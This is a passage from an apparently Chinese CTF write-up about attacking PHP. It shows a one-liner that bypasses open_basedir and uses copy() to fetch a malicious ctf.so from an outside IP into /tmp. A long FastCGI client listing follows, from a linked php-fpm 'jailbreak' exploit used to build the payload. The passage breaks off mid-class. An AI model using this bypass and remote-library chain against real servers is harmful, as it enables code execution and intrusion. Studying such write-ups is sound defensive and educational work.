href="https://www.php.net/manual/zh/function.copy.php%EF%BC%8C%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD">https://www.php.net/manual/zh/function.copy.php，进行远程下载</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;css&#x27;</span>);chdir(<span class="string">&#x27;css&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);copy(<span class="string">&#x27;http://45.76.110.116:8000/ctf.so&#x27;</span>,<span class="string">&#x27;/tmp/ctf.so&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175830.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175843.png"></p><ul><li>生成打php-fpm的payload</li></ul><p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_sock = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_host = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_port = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_keepAlive = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$host, $port = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = $host;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params">$b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)$b;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params">$type, $content, $requestId = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr($type)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr($requestId &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr(($clen &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr($clen &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . $content;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params">$data, $length = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> ($length === <span class="literal">null</span>) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="keyword">array</span>();</span><br><span class="line">        $ret[<span class="string">&#x27;version&#x27;</span>]       = ord($data&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;type&#x27;</span>]          = ord($data&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;requestId&#x27;</span>]     = (ord($data&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;contentLength&#x27;</span>] = (ord($data&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;paddingLength&#x27;</span>] = ord($data&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;reserved&#x27;</span>]      = ord($data&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($packet = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = <span class="keyword">$this</span>-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                $len  = $resp[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> ($len &amp;&amp; $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $len)) &#123;</span><br><span class="line">                    $len -= strlen($buf);</span><br><span class="line">                    $resp[<span class="string">&#x27;content&#x27;</span>] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $resp[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $resp;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> $requestedInfo</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($requestedInfo <span class="keyword">as</span> $info) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildNvpair($info, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, $request, <span class="number">0</span>));</span><br><span class="line">        $resp = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> ($resp[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair($resp[<span class="string">&#x27;content&#x27;</span>], $resp[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span 